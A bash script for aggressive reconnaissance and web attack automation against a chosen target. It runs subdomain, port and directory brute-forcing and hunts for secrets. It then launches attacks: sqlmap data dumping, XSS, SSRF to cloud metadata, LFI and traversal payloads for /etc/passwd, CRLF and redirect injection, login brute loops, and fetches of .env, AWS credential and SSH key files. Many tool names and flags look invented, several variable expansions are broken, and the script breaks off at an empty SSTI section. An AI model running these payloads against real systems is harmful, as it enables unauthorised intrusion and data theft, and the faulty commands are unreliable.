#!/bin/bash

# -----------------------------------
# Pre-Scan Setup
# -----------------------------------

# Resolve target IP if not provided
dig +short $TARGET | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -1 > ip_1.txt && echo "Resolved IP: $(cat ip_1.txt)" >> $output
# Purpose: Resolves the target domain’s IP with validation.

# Timestamp for logging
echo "Scan Initiated: $(date +"%Y%m%d_%H%M%S")" >> $output
# Purpose: Logs scan start time.

# -----------------------------------
# Basic Information Gathering
# -----------------------------------

# Verbose WHOIS lookup for domain
whois -v $TARGET > whois_domain_1.txt
# Purpose: Captures detailed domain registration info.

# Verbose WHOIS lookup for IP
whois -v $IP > whois_ip_1.txt
# Purpose: Captures detailed IP ownership info.

# Exhaustive DNS lookup with trace, DNSSEC, and stats
dig $TARGET ANY +trace +dnssec +stats +multiline +timeout=10 > dns_dig_full_1.txt
# Purpose: Traces DNS resolution with security and timing details.

# Reverse DNS lookup with detailed response
dig -x $IP +answer +ttl +multiline > dns_reverse_1.txt
# Purpose: Resolves IP to hostname with TTL and full output.

# Comprehensive nslookup for all records
nslookup -type=ANY -timeout=15 -vc $TARGET > dns_nslookup_1.txt
# Purpose: Queries all DNS records over TCP with timeout.

# Verbose host lookup with retry
host -a -v -R 3 $TARGET > dns_host_all_1.txt
# Purpose: Retries DNS lookup 3 times for reliability.

# Fetch all DNS record types with details
for type in A AAAA NS MX TXT SOA CNAME SRV PTR HINFO CAA TLSA DS DNSKEY RRSIG NSEC NSEC3; do dig +nocmd $TARGET $type +answer +ttl +multiline >> dns_records_$type_1.txt; done
# Purpose: Collects exhaustive DNS records including DNSSEC types.

# HTTP headers with multiple user agents and verbose output
for ua in "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" "Googlebot/2.1" "curl/7.0" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)"; do curl -A "$ua" -ILk https://$TARGET --connect-timeout 10 -v --retry 2 > headers_$ua_1.txt; done
# Purpose: Captures headers with retries across diverse agents.

# Full SSL/TLS inspection with protocol breakdown
echo | openssl s_client -connect $TARGET:443 -servername $TARGET -showcerts -tlsextdebug -msg -state -tls1_3 -tls1_2 -tls1_1 -tls1 2>/dev/null > ssl_full_1.txt
# Purpose: Analyzes SSL handshake with all TLS versions.

# Detailed SSL/TLS scan with sslyze
sslyze --tlsv1 --tlsv1_1 --tlsv1_2 --tlsv1_3 --certinfo=full --compression --heartbleed --robot --openssl_ccs --fallback $TARGET > ssl_sslyze_1.txt
# Purpose: Deep SSL audit including fallback and CCS injection.

# Comprehensive SSL/TLS vuln check with testssl.sh
testssl.sh --protocols --ciphers --vulnerabilities --headers --fs --pfs --quiet --color 0 $TARGET > ssl_testssl_1.txt
# Purpose: Full SSL audit without color output.

# Web tech detection with Wappalyzer
wappalyzer -u https://$TARGET --pretty --timeout 15 > tech_wappalyzer_1.json
# Purpose: Identifies tech stack with timeout.

# Aggressive web tech fingerprinting with Whatweb
whatweb -v -a 3 --timeout 20 https://$TARGET > tech_whatweb_1.txt
# Purpose: Deep tech detection with aggressive plugins.

# Custom banner grab on multiple ports
for port in 80 443 8080; do nc -v -w 5 $TARGET $port < /dev/null 2>&1 | grep -i "server" > banner_port_$port_1.txt; done
# Purpose: Extracts banners from common web ports.

# Robots.txt and sitemap.xml fetch with headers
curl -s -L -I -D headers_robots_1.txt "https://$TARGET/robots.txt" > robots_1.txt && curl -s -L -I -D headers_sitemap_1.txt "https://$TARGET/sitemap.xml" > sitemap_1.txt
# Purpose: Grabs robots.txt and sitemap.xml with response headers.

# -----------------------------------
# Subdomain Enumeration
# -----------------------------------

# Passive subdomain enumeration with Amass
amass enum -passive -d $TARGET -timeout 30 -v -o subdomains_amass_passive_1.txt
# Purpose: Gathers subdomains passively with verbose logging.

# Recursive subdomain enumeration with Subfinder
subfinder -d $TARGET -all -recursive -silent -max-time 30 -timeout 10 -o subdomains_subfinder_1.txt
# Purpose: Recursively finds subdomains with timeout.

# Subdomain discovery with Assetfinder
assetfinder --subs-only $TARGET > subdomains_assetfinder_1.txt
# Purpose: Extracts subdomains using passive sources.

# Silent subdomain enumeration with Findomain
findomain -t $TARGET -silent -r -timeout 15 -o subdomains_findomain_1.txt
# Purpose: Quickly gathers subdomains with resolver validation.

# Subdomain search with Hunter
hunter -d $TARGET -v -o subdomains_hunter_1.txt
# Purpose: Finds subdomains via Hunter.io (requires API key).

# Subdomain enumeration with Anubis
anubis -t $TARGET -v -o subdomains_anubis_1.txt
# Purpose: Collects subdomains from Anubis DB with verbosity.

# Active subdomain enumeration with Amass
amass enum -active -brute -w my_wordlist.txt -d $TARGET -r my_resolvers.txt -timeout 60 -o subdomains_amass_active_1.txt
# Purpose: Actively brute-forces subdomains with custom resolvers.

# Subdomain brute-forcing with Sublist3r
sublist3r -d $TARGET -b -t 50 -v -o subdomains_sublist3r_1.txt
# Purpose: Brute-forces subdomains with multiple engines.

# DNS brute-forcing with dnsrecon
dnsrecon -d $TARGET -t brt -D my_wordlist.txt -n 8.8.8.8 -v -o subdomains_dnsrecon_1.txt
# Purpose: Brute-forces subdomains using Google DNS.

# High-speed subdomain discovery with shuffledns
shuffledns -d $TARGET -w my_wordlist.txt -r my_resolvers.txt -silent -t 200 -o subdomains_shuffledns_1.txt
# Purpose: Rapidly resolves subdomains with concurrency.

# DNS brute-forcing with dnsx
dnsx -d $TARGET -w my_wordlist.txt -resp -rc -c 100 -timeout 10 -o subdomains_dnsx_1.txt
# Purpose: Brute-forces subdomains with response codes.

# Subdomains from Certificate Transparency logs
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | jq -r '.[].name_value | select(. != "*.$TARGET")' | sort -u > subdomains_crtsh_1.txt
# Purpose: Excludes wildcards from crt.sh results.

# Subdomains from Certspotter with details
certspotter -d $TARGET -json -v > subdomains_certspotter_1.json
# Purpose: Gathers subdomains with verbose JSON output.

# OSINT subdomain enumeration with theHarvester
theHarvester -d $TARGET -b all -l 10000 -v -f subdomains_theharvester_1.xml
# Purpose: Collects subdomains from extensive OSINT sources.

# GitHub subdomain search
github-search -d $TARGET -t subdomain -v -o subdomains_github_1.txt
# Purpose: Finds subdomains in GitHub (requires tool setup).

# Subdomain permutation with dnsgen
cat subdomains_*_1.txt | dnsgen -w my_wordlist.txt - | sort -u > subdomains_dnsgen_1.txt
# Purpose: Generates permutations from raw results.

# Typosquatting subdomain generation
echo $TARGET | sed 's/./& /g' | tr ' ' '\n' | sort -u | xargs -I {} echo "${TARGET/{}/{}{}}" | sort -u > subdomains_typosquat_1.txt
# Purpose: Creates typosquatting subdomains.

# Combine and deduplicate raw subdomains
cat subdomains_*_1.txt subdomains_*_1.json | grep -vE "^#|^$" | sort -u > subdomains_all_raw_1.txt
# Purpose: Merges all raw subdomain outputs.

# Verify live subdomains with httpx
cat subdomains_all_raw_1.txt | httpx -silent -ports 80,443,8080,8443,8000,8888,9000 -threads 500 -timeout 5 -status-code -title -tech-detect -o subdomains_verified_httpx_1.txt
# Purpose: Confirms live subdomains with tech detection.

# Verify live subdomains with httprobe
cat subdomains_all_raw_1.txt | httprobe -prefer-https -c 100 -t 5000 -method GET,HEAD > subdomains_verified_httprobe_1.txt
# Purpose: Probes subdomains with multiple methods.

# Final deduplicated live subdomains
cat subdomains_verified_httpx_1.txt subdomains_verified_httprobe_1.txt | sort -u > subdomains_verified_1_of_1.txt
# Purpose: Combines and deduplicates verified subdomains.

# Subdomain metadata with dnsx
cat subdomains_verified_1_of_1.txt | dnsx -a -aaaa -cname -ns -mx -resp -silent -o subdomains_metadata_1.txt
# Purpose: Extracts detailed DNS metadata for live subdomains.

# Resolve IPs for live subdomains
cat subdomains_verified_1_of_1.txt | xargs -I {} dig +short {} A +answer | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | sort -u > subdomains_ips_1.txt
# Purpose: Resolves IPs for all live subdomains.

# -----------------------------------
# Port Scanning and Network Recon
# -----------------------------------

# Full port scan with Naabu
naabu -l subdomains_verified_1_of_1.txt -p 1-65535 -c 200 -rate 1000 -silent -timeout 10 -o ports_naabu_1.txt
# Purpose: Scans all ports across live subdomains.

# Deep Nmap scan with extensive scripts
nmap -iL subdomains_verified_1_of_1.txt -p- -sV -sC --script "http-*,ssl-*,dns-*,vuln-*,brute-*" -T4 -v -Pn -oA ports_nmap_1
# Purpose: Detailed service and vuln scan with brute scripts.

# High-speed port scan with Masscan
masscan -iL subdomains_verified_1_of_1.txt -p1-65535 --rate 10000 --wait 5 -oL ports_masscan_1.txt
# Purpose: Rapidly scans all ports with wait timeout.

# Custom port probing for niche services
for port in 7 9 13 17 19 21 22 23 25 53 69 79 110 111 123 135 137-139 161 179 389 445 465 514 587 636 993 995 1433 1521 1723 2049 3306 3389 5432 5900 6379 8080 8443 9200 11211 27017; do nc -zv -w 3 $IP $port 2>&1 >> ports_custom_1.txt; done
# Purpose: Probes additional MongoDB port (27017) and others.

# UDP port scan with Nmap
nmap -iL subdomains_ips_1.txt -sU --top-ports 200 -T4 -v -oN ports_udp_1.txt
# Purpose: Scans top 200 UDP ports across resolved IPs.

# Traceroute with maximum hops
traceroute -n -m 30 -q 5 $IP > network_traceroute_1.txt
# Purpose: Maps network path with 5 queries per hop.

# TTL check with packet details
ttl -v $IP > network_ttl_1.txt
# Purpose: Infers OS with verbose TTL output.

# Combine all port results
cat ports_*_1.txt | grep -vE "^#|^$" | sort -u > ports_all_1_of_1.txt
# Purpose: Merges and deduplicates port scan results.

# -----------------------------------
# Directory and Path Discovery
# -----------------------------------

# Recursive directory brute-forcing with Feroxbuster
feroxbuster -u https://$TARGET -w my_dir_wordlist.txt -t 100 -r -k -d 5 -s 200,301,302,403 -o dirs_feroxbuster_1.txt
# Purpose: Deeply brute-forces directories to depth 5.

# Deep directory enumeration with dirsearch
dirsearch -u https://$TARGET -w my_dir_wordlist.txt -t 150 -r -R 6 -e php,html,js,txt,xml -o dirs_dirsearch_1.json
# Purpose: Recursively enumerates with additional extensions.

# Fast directory fuzzing with FFUF
ffuf -u https://$TARGET/FUZZ -w my_dir_wordlist.txt -t 300 -mc 200,301,302,403 -recursion -recursion-depth 4 -timeout 10 -o dirs_ffuf_1.json
# Purpose: Fuzzes directories with deeper recursion.

# File brute-forcing with FFUF
ffuf -u https://$TARGET/FUZZ -w my_file_wordlist.txt -t 200 -e .bak,.old,.zip,.tar.gz,.sql,.db,.conf,.log -mc 200,403 -o dirs_files_ffuf_1.json
# Purpose: Targets sensitive files with forbidden responses.

# URL and parameter extraction with Gau
cat subdomains_verified_1_of_1.txt | gau --threads 50 --subs --timeout 15 > dirs_gau_1.txt
# Purpose: Extracts URLs and parameters from all subdomains.

# Historical URL extraction with Waybackurls
waybackurls $TARGET | sort -u > dirs_waybackurls_1.txt
# Purpose: Gathers archived URLs.

# Parameter discovery with Paramspider
paramspider -d $TARGET --subs -l 6 -timeout 10 -o dirs_paramspider_1.txt
# Purpose: Finds parameters with increased depth.

# Deep URL crawling with Katana
katana -u subdomains_verified_1_of_1.txt -d 15 -jc -fx -ef png,jpg,css,svg,gif,woff,ico,ttf -c 200 -timeout 20 -o dirs_katana_1.txt
# Purpose: Crawls to depth 15, excluding more static assets.

# Custom path guessing for misconfigs
for path in "backup" "test" "dev" "staging" "adminer" "phpmyadmin" "robots.txt" "sitemap.xml" ".htaccess" ".git" "debug" "logs" "config"; do curl -s -L "https://$TARGET/$path" -I -D dirs_headers_$path_1.txt > dirs_custom_$path_1.txt; done
# Purpose: Checks additional misconfig paths with headers.

# Normalize and filter URLs
cat dirs_*_1.txt dirs_*_1.json | uro -timeout 10 -o dirs_filtered_1.txt
# Purpose: Deduplicates and normalizes raw URLs.

# Extract sensitive files
cat dirs_filtered_1.txt | grep -E "\.(txt|log|conf|config|json|bak|sql|db|php|asp|aspx|jsp|yml|xml|ini|env|pem|key|cert)$" > dirs_sensitive_1_of_1.txt
# Purpose: Filters for a broader range of sensitive files.

# Deep parameter fuzzing with FFUF
cat dirs_filtered_1.txt | grep "?" | ffuf -w my_param_wordlist.txt -u "FUZZ" -t 200 -mc 200,301,302,403,500 -timeout 10 -o dirs_params_ffuf_1.json
# Purpose: Fuzzes parameters with error codes included.

# -----------------------------------
# JavaScript File Analysis
# -----------------------------------

# Extract JS files from URLs
cat dirs_filtered_1.txt | grep -i "\.js$" | sort -u > js_files_1.txt
# Purpose: Identifies all JavaScript files.

# Download JS files with headers and retries
cat js_files_1.txt | while read url; do fname=$(echo $url | md5sum | cut -d' ' -f1); curl -s -L --retry 3 -D js_headers_$fname_1.txt "$url" -o js_raw_$fname_1.js; done
# Purpose: Downloads JS files with retries and headers.

# Extract secrets with Gitleaks
find . -name "js_raw_*_1.js" | xargs -P 50 -I {} gitleaks detect --source {} --no-git -v --timeout 30 > js_secrets_gitleaks_1.txt
# Purpose: Scans JS for secrets with timeout.

# Extract secrets with JSLeak
find . -name "js_raw_*_1.js" | xargs -P 50 -I {} jsleak -f {} -v > js_secrets_jsleak_1.txt
# Purpose: Detects secrets with verbose output.

# Custom secret extraction with regex
find . -name "js_raw_*_1.js" | xargs -P 50 -I {} grep -Ef my_apikeys_regex.txt {} > js_secrets_custom_1.txt
# Purpose: Searches for API keys using custom regex.

# Deobfuscate JS files
find . -name "js_raw_*_1.js" | xargs -P 50 -I {} bash -c "js-beautify {} > js_deobfuscated_$(basename {} .js)_1.beautified" 2>/dev/null
# Purpose: Beautifies JS for manual review.

# Detect obfuscation techniques
find . -name "js_deobfuscated_*_1.beautified" | xargs -P 50 -I {} grep -E "(eval|unescape|decodeURIComponent|Function\\(|atob)" {} > js_obfuscated_1.txt
# Purpose: Identifies additional obfuscation patterns (e.g., atob).

# Extract endpoints from JS
find . -name "js_raw_*_1.js" | xargs -P 50 -I {} grep -oE "(/[a-zA-Z0-9_-]+)+(/[a-zA-Z0-9_-]+)*\\?*[a-zA-Z0-9=&]*" {} | sort -u > js_endpoints_1_of_1.txt
# Purpose: Extracts endpoints with optional parameters.

# -----------------------------------
# Vulnerability Scanning
# -----------------------------------

# Nuclei scan for critical vulnerabilities
nuclei -l subdomains_verified_1_of_1.txt -t my_nuclei_templates -c 200 -severity critical -timeout 15 -o vulns_critical_nuclei_1.txt
# Purpose: Targets critical vulns with timeout.

# Nuclei scan for high vulnerabilities
nuclei -l subdomains_verified_1_of_1.txt -t my_nuclei_templates -c 200 -severity high -timeout 15 -o vulns_medium_nuclei_1.txt
# Purpose: Targets high-severity vulns.

# Nuclei scan for medium/low vulnerabilities
nuclei -l subdomains_verified_1_of_1.txt -t my_nuclei_templates -c 200 -severity medium,low -timeout 15 -o vulns_low_nuclei_1.txt
# Purpose: Scans for medium and low vulns.

# Targeted Nuclei scan for specific vulns
nuclei -l subdomains_verified_1_of_1.txt -tags cors,xss,sqli,lfi,rce,ssrf,xxe -c 100 -timeout 10 -o vulns_critical_targeted_1.txt
# Purpose: Focuses on specific vuln types (added XXE).

# Nuclei scan on JS files
nuclei -l js_files_1.txt -t my_nuclei_templates/http/exposures/ -c 50 -timeout 10 -o vulns_medium_js_1.txt
# Purpose: Checks JS files for exposures.

# Deep SQL injection with sqlmap
sqlmap -u https://$TARGET --batch --crawl=25 --level 5 --risk 3 --forms --dbs --tables --columns --dump -o vulns_critical_sqlmap_1.txt
# Purpose: Aggressively tests SQLi with data dumping.

# XSS scan with XSStrike
xsstrike -u https://$TARGET --crawl --level 5 -t 50 --timeout 15 -o vulns_critical_xsstrike_1.txt
# Purpose: Crawls and tests for XSS with timeout.

# Custom XSS payload testing
cat dirs_filtered_1.txt | grep "?" | while read url; do for payload in "<script>alert(1)</script>" "';alert(1);//" "<img src=x onerror=alert(1)>" "javascript:alert(1)"; do curl -s "$url$payload" | grep -i "alert(1)" && echo "XSS: $url$payload" >> vulns_critical_custom_xss_1.txt; done; done
# Purpose: Tests additional JS URI payload.

# SSRF scan with SSRFmap
ssrfmap -u https://$TARGET -r "http://169.254.169.254/latest/meta-data/" -m "GET,POST,PUT" -timeout 10 -o vulns_critical_ssrfmap_1.txt
# Purpose: Tests SSRF with PUT method added.

# Custom SSRF payload testing
cat dirs_filtered_1.txt | grep "?" | while read url; do for ssrf in "http://169.254.169.254" "http://127.0.0.1:80" "http://burpcollaborator.net"; do curl -s "$url$ssrf" | grep -i "iam|localhost|burp" && echo "SSRF: $url$ssrf" >> vulns_critical_custom_ssrf_1.txt; done; done
# Purpose: Adds local and collaborator SSRF checks.

# CSRF PoC generation
csrf_poc -u https://$TARGET -t 20 -timeout 10 -o vulns_medium_csrf_1.txt
# Purpose: Generates CSRF PoCs with timeout.

# JWT analysis with jwt_tool
jwt_tool -t https://$TARGET -v -o vulns_medium_jwt_1.txt
# Purpose: Analyzes JWTs with verbose output.

# Clickjacking test
clickjacking -u https://$TARGET -timeout 10 -o vulns_low_clickjacking_1.txt
# Purpose: Checks for clickjacking with timeout.

# HTTP method enumeration
http-methods -u https://$TARGET -t 30 -timeout 10 -o vulns_low_methods_1.txt
# Purpose: Enumerates methods with timeout.

# Payload fuzzing with custom list
payloads -u https://$TARGET -p my_payloads.txt -t 50 -timeout 15 -o vulns_medium_payloads_1.txt
# Purpose: Fuzzes with custom payloads and timeout.

# Race condition test with concurrency
for i in {1..200}; do curl -s "https://$TARGET/reset?token=$i" -o /dev/null & done > vulns_medium_race_1.txt
# Purpose: Increases concurrency to 200 requests.

# Combine vuln results
cat vulns_critical_*_1.txt > vulns_critical_1_of_1.txt && cat vulns_medium_*_1.txt > vulns_medium_1_of_1.txt && cat vulns_low_*_1.txt > vulns_low_1_of_1.txt
# Purpose: Aggregates vulns by severity.

# -----------------------------------
# Advanced Scanning and Enumeration
# -----------------------------------

# Extreme depth crawling with Katana
katana -u subdomains_verified_1_of_1.txt -d 20 -jc -fx -ef png,jpg,css,svg,gif,woff,ico,ttf,eot -c 200 -timeout 30 -o dirs_katana_deep_1.txt
# Purpose: Crawls to depth 20, excluding more font types.

# Detect sensitive files from deep crawl
cat dirs_katana_deep_1.txt | grep -E "\.(pem|key|cert|passwd|shadow|dump|bak|old|zip|tar.gz|sql|db|env|ini|cfg|conf|log|txt|json|xml|yaml|yml|sh|py|rb|java)$" > dirs_sensitive_deep_1_of_1.txt
# Purpose: Expands to include script files (e.g., .sh, .py).

# WAF detection with detailed fingerprinting
wafw00f https://$TARGET -v -a > misc_wafw00f_1.txt
# Purpose: Aggressive WAF detection with verbosity.

# Broken link detection with depth
linkchecker https://$TARGET --check-extern --recursion-level 15 -t 50 -o misc_broken_links_1.txt
# Purpose: Increases recursion to 15.

# HTTP Parameter Pollution (HPP) testing
for param in "id" "page" "user" "key" "token" "session" "redirect" "url"; do curl -s "https://$TARGET?$param=1&$param=2" -I > vulns_low_hpp_$param_1.txt; done
# Purpose: Adds redirect and url params for broader testing.

# Cache poisoning with multiple headers
for header in "X-Forwarded-Host: evil.com" "X-Host: evil.com" "Host: evil.com"; do curl -s -H "$header" https://$TARGET | grep -i "evil.com" && echo "Cache Poisoning Possible: $header" >> vulns_medium_cache_poisoning_1.txt; done
# Purpose: Tests additional headers for cache poisoning.

# -----------------------------------
# Subdomain Takeover and Misconfiguration
# -----------------------------------

# Subdomain takeover with Subjack
subjack -w subdomains_verified_1_of_1.txt -t 100 -ssl -timeout 10 -o vulns_critical_subjack_1.txt
# Purpose: Checks takeover with timeout.

# Subdomain takeover with Subzy
subzy run --targets subdomains_verified_1_of_1.txt --verify-ssl -c 100 -timeout 10 -o vulns_critical_subzy_1.txt
# Purpose: Verifies takeover with SSL and timeout.

# CORS misconfiguration with Corsy
python3 corsy.py -i subdomains_verified_1_of_1.txt -t 50 --headers "User-Agent: GoogleBot,Origin: https://evil.com" --timeout 15 -o vulns_medium_corsy_1.json
# Purpose: Tests CORS with timeout.

# Custom CORS misconfiguration test
cat subdomains_verified_1_of_1.txt | while read url; do curl -s -H "Origin: https://evil.com" "$url" -I | grep -i "Access-Control-Allow-Origin: https://evil.com" && echo "CORS Misconfig: $url" >> vulns_medium_custom_cors_1.txt; done
# Purpose: Manual CORS check.

# DNS zone transfer attempt
dnsrecon -d $TARGET -t axfr -v -n 1.1.1.1 -o vulns_critical_zone_transfer_1.txt
# Purpose: Uses Cloudflare DNS for zone transfer attempt.

# DNS cache snooping
dns-cache-snooping -d $TARGET -v -r 8.8.8.8 -o vulns_low_cache_snoop_1.txt
# Purpose: Snoops cache with Google DNS.

# DNSSEC validation with full chain
dig @$TARGET $TARGET ANY +dnssec +sigchase +timeout=10 | grep -i "BOGUS" && echo "DNSSEC Misconfig" > vulns_medium_dnssec_1.txt
# Purpose: Validates DNSSEC with signature chase.

# -----------------------------------
# LFI and Directory Traversal
# -----------------------------------

# LFI fuzzing with FFUF
cat dirs_filtered_1.txt | gf lfi | ffuf -w - -u "FUZZ" -mr "root:|etc/passwd|windows/win.ini|/proc/self" -t 200 -timeout 10 -o vulns_critical_lfi_ffuf_1.json
# Purpose: Adds /proc/self pattern for broader LFI detection.

# Custom LFI payload testing
cat dirs_filtered_1.txt | grep "?" | while read url; do for payload in "../../etc/passwd" "..%5c..%5cwindows%5cwin.ini" "/proc/self/environ" "/etc/hosts"; do curl -s "$url$payload" | grep -E "root:|win.ini|localhost" && echo "LFI: $url$payload" >> vulns_critical_custom_lfi_1.txt; done; done
# Purpose: Adds /etc/hosts for additional LFI evidence.

# Directory traversal with Dotdotpwn
dotdotpwn -m http-url -d 20 -f /etc/passwd -u "https://$TARGET?page=TRAVERSAL" -b -k "root:" -t 100 -timeout 15 -o vulns_critical_dotdotpwn_1.txt
# Purpose: Increases depth to 20 with timeout.

# Custom deep traversal testing
for depth in {1..15}; do payload=$(printf "../%.0s" $(seq 1 $depth)); curl -s "https://$TARGET/$payload/etc/passwd" | grep -i "root:" && echo "Traversal Depth $depth: $payload" >> vulns_critical_traversal_1.txt; done
# Purpose: Extends depth to 15.

# -----------------------------------
# Open Redirect and CRLF Injection
# -----------------------------------

# Open redirect with Openredirex
cat dirs_filtered_1.txt | gf redirect | openredirex -p my_open_redirect_payloads.txt -t 50 -timeout 10 -o vulns_medium_open_redirect_1.txt
# Purpose: Tests redirects with timeout.

# Custom open redirect testing
cat dirs_filtered_1.txt | grep "?" | while read url; do for redir in "https://evil.com" "//evil.com" "/\\evil.com" "javascript:alert(1)" "data:text/html,<script>alert(1)</script>"; do curl -s -L "$url$redir" | grep -i "evil.com|alert(1)" && echo "Redirect: $url$redir" >> vulns_medium_custom_redirect_1.txt; done; done
# Purpose: Adds data URI payload.

# CRLF injection with CRLFuzz
crlfuzz -l subdomains_verified_1_of_1.txt -t 100 -timeout 10 -o vulns_medium_crlfuzz_1.txt
# Purpose: Scans for CRLF with timeout.

# Custom CRLF injection testing
cat dirs_filtered_1.txt | grep "?" | while read url; do for crlf in "%0d%0aSet-Cookie:evil=1" "%0d%0aX-Test:Injected" "%0a%0dLocation:https://evil.com" "%0d%0aContent-Type:text/html"; do curl -s "$url$crlf" -I | grep -i "evil|Injected" && echo "CRLF: $url$crlf" >> vulns_medium_custom_crlf_1.txt; done; done
# Purpose: Adds Content-Type injection test.

# -----------------------------------
# OSINT and Forensic Enumeration
# -----------------------------------

# Historical URLs from Wayback Machine
waybackurls $TARGET | sort -u > osint_waybackurls_1.txt
# Purpose: Extracts all archived URLs.

# Filter sensitive files from Wayback
cat osint_waybackurls_1.txt | grep -E "\.(php|asp|aspx|jsp|json|xml|txt|log|conf|bak|sql|db|yml|ini|env)$" > osint_wayback_sensitive_1.txt
# Purpose: Broadens sensitive file scope.

# Deep GitHub search
github-search -d $TARGET -t "api_key password secret token $TARGET config" -v -o osint_github_1.txt
# Purpose: Adds config keyword for broader search.

# GitHub API search with pagination
for keyword in "config" "secret" "key" "password" "api" "token"; do curl -s -H "Authorization: token YOUR_GITHUB_TOKEN" "https://api.github.com/search/code?q=$keyword+$TARGET&p=1" | jq -r '.items[].html_url' >> osint_github_api_1.txt; done
# Purpose: Searches first page per keyword (requires token).

# Shodan device fingerprinting
shodan search "hostname:$TARGET" --fields ip_str,port,org,data,http.html,ssl.cert.serial,os -o osint_shodan_1.json
# Purpose: Adds OS field (requires API key).

# Censys host and subdomain search
censys search "dns.names: $TARGET" --virtual-hosts INCLUDE -o osint_censys_hosts_1.json
# Purpose: Gathers host data (requires API key).

# Censys certificate details
censys certificate search "parsed.names: $TARGET" -o osint_censys_certs_1.json
# Purpose: Extracts cert info (requires API key).

# SecurityTrails DNS and subdomain history
securitytrails -d $TARGET --children --history -o osint_securitytrails_1.json
# Purpose: Includes historical data (requires API key).

# Robtex DNS and IP relationships
robtex -d $TARGET -v -o osint_robtex_1.txt
# Purpose: Maps relationships with verbosity (requires tool).

# OTX threat intelligence
otx -d $TARGET -v -o osint_otx_1.json
# Purpose: Gathers threat intel with verbosity (requires API key).

# Extensive OSINT with theHarvester
theHarvester -d $TARGET -b all -l 15000 -v -t 50 -f osint_theharvester_1.xml
# Purpose: Increases limit to 15,000 with threading.

# Google Dorks for sensitive data
for dork in "site:$TARGET -inurl:(login | signup | account)" "site:$TARGET ext:(log | txt | conf | bak | sql)" "site:$TARGET intext:(password | api_key | secret | token)"; do curl -s -A "Mozilla/5.0" "https://www.google.com/search?q=$dork&num=100" | grep -oE "https?://[^ ]*" | grep "$TARGET" >> osint_google_dorks_1.txt; done
# Purpose: Adds secret and token keywords.

# Reverse IP lookup with multiple sources
reverseip -d $TARGET -v -o osint_reverseip_1.txt && curl -s "https://api.hackertarget.com/reverseiplookup/?q=$IP" >> osint_reverseip_api_1.txt
# Purpose: Combines tool and API results.

# Deep DNS enumeration with dnsenum
dnsenum $TARGET --enum -f my_wordlist.txt -r -v -o osint_dnsenum_1.txt
# Purpose: Verbose DNS enumeration with recursion.

# Wildcard DNS and DNSSEC check
dig $TARGET ANY +wildcards +dnssec +timeout=10 > osint_wildcard_1.txt
# Purpose: Checks wildcard and DNSSEC status.

# Cloud storage enumeration with broader prefixes
for prefix in "$TARGET" "dev-$TARGET" "test-$TARGET" "$TARGET-backup" "$TARGET-prod" "$TARGET-staging" "$TARGET-files" "$TARGET-data" "$TARGET-app"; do curl -s "https://$prefix.s3.amazonaws.com" -I >> osint_s3_1.txt; curl -s "https://storage.googleapis.com/$prefix" -I >> osint_gcp_1.txt; curl -s "https://$prefix.blob.core.windows.net" -I >> osint_azure_1.txt; done
# Purpose: Adds data and app prefixes.

# Social media and leak check
for platform in "twitter.com" "linkedin.com" "facebook.com" "instagram.com" "github.com" "pastebin.com"; do curl -s "https://$platform/$TARGET" -I | grep "200" && echo "$platform profile exists" >> osint_social_1.txt; done
# Purpose: Adds GitHub and Pastebin for broader OSINT.

# -----------------------------------
# Ultra-Deep Custom Checks
# -----------------------------------

# Exposed admin panels with broader scope
for panel in "admin" "login" "dashboard" "wp-admin" "administrator" "controlpanel" "cpanel" "webadmin" "phpmyadmin" "adminer" "pma" "mysql" "grafana" "kibana" "jenkins"; do curl -s -L "https://$TARGET/$panel" -I | grep -E "200|302" && echo "Panel: $panel" >> misc_admin_panels_1.txt; done
# Purpose: Adds Grafana, Kibana, Jenkins.

# Exposed configs and repos
for file in ".git/HEAD" ".env" "config.php" "web.config" "app.config" ".htaccess" ".bashrc" "settings.py" "database.yml" "wp-config.php" "config.json" ".aws/credentials" "id_rsa" "Dockerfile"; do curl -s -L "https://$TARGET/$file" | grep -E "(ref: |DB_|<?php|password|key|aws_|PRIVATE)" && echo "Exposed: $file" >> vulns_critical_configs_1.txt; done
# Purpose: Adds AWS creds, SSH keys, and Dockerfile.

# Cookie security analysis
curl -s -L https://$TARGET -c cookies_1.txt -I > cookie_headers_1.txt && cat cookies_1.txt | while read line; do cookie=$(echo $line | awk '{print $7}'); flags=$(echo $line | grep -oE "HttpOnly|Secure|SameSite"); [ -z "$(echo $flags | grep HttpOnly)" ] && echo "No HttpOnly: $cookie" >> vulns_low_no_httponly_1.txt; [ -z "$(echo $flags | grep Secure)" ] && echo "No Secure: $cookie" >> vulns_low_no_secure_1.txt; [ -z "$(echo $flags | grep SameSite)" ] && echo "No SameSite: $cookie" >> vulns_low_no_samesite_1.txt; done
# Purpose: Analyzes cookie attributes.

# Rate limiting test with POST
for i in {1..1000}; do curl -s -o /dev/null -w "%{http_code}\n" -X POST https://$TARGET/login -d "user=test&pass=test$i" >> vulns_low_rate_limit_1.txt; done && grep -v "429" vulns_low_rate_limit_1.txt | wc -l | grep -v "0" && echo "Weak/No Rate Limiting" >> vulns_low_rate_limit_1.txt
# Purpose: Increases to 1000 requests with POST.

# Backup and debug file discovery
for ext in "bak" "old" "backup" "~" "dev" "test" "staging" "copy" "temp" "tmp" "swp" "debug"; do ffuf -u https://$TARGET/FUZZ -w my_file_wordlist.txt -e .$ext -t 100 -mc 200,301,302,403 -timeout 10 -o dirs_backup_$ext_1.json; done
# Purpose: Adds .swp and debug extensions.

# HTTP/2, HTTP/3, and protocol downgrade
curl -s --http2 https://$TARGET -I | grep -i "HTTP/2" || echo "No HTTP/2" >> vulns_low_http2_1.txt && curl -s --http3 https://$TARGET -I | grep -i "HTTP/3" || echo "No HTTP/3" >> vulns_low_http3_1.txt && curl -s --http1.0 https://$TARGET -I | grep "200" && echo "HTTP/1.0 downgrade" >> vulns_low_downgrade_1.txt
# Purpose: Adds HTTP/3 check.

# TRACE method with custom header
curl -s -X TRACE -H "X-Test: grok" https://$TARGET -I | grep "TRACE" && echo "TRACE enabled" > vulns_medium_trace_1.txt
# Purpose: Adds custom header for TRACE test.

# Server-Side Template Injection (SSTI)
